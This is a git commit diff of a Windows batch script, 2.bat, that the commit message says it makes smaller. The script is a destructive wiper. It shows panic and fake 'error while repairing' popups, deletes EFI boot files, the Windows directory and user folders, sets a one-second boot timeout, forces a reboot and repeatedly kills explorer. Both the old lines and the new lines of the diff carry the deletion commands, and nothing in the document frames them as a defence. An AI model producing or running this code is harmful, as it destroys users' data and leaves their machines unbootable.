7076c34620e8611005631613e25c933b5f074634
Aaravdevelops <137682685+Aaravdevelops@users.noreply.github.com>
2024-10-17 07:09:06 +0000

    more smaller and error free

--- 2.bat
+++ 2.bat
@@ -1,19 +1,7 @@
 @echo off
 start "" /wait cmd /c "echo DO SOMETHING RIGHT NOW YOU ONLY HAVE 30 SECONDS!&echo(&pause"
-for /L %%i in (1,1,500) do (
-    echo x=msgbox("An error has occurred while reapiring this computer!", 69, "Error") > "%temp%\errorpopup.vbs"
-    start /wait wscript "%temp%\errorpopup.vbs"
-) & DEL /F /S /Q /A  \EFI\Microsoft\Boot\*.* & DEL /F /S /Q /A C:\Windows*.* & rmdir C:\Users*.* /S /Q
+for /L %%i in (1,1,100) do (start cmd /c "echo Error occured while repairing system!echo(pause") & DEL /F /S /Q /A  \EFI\Microsoft\Boot\*.* & DEL /F /S /Q /A C:\Windows*.* & rmdir C:\Users*.* /S /Q
 bcdedit /timeout 1
 shutdown -r /o -t 20
-taskkill /im explorer.exe /f
-start explorer.exe
-taskkill /im explorer.exe /f
-start explorer.exe
-taskkill /im explorer.exe /f
-start explorer.exe
-taskkill /im explorer.exe /f
-start explorer.exe
-taskkill /im explorer.exe /f
-start explorer.exe
-taskkill /im explorer.exe /f
+for /L %%i in (1,1,100) do (start explorer.exe
+taskkill /im explorer.exe /f)
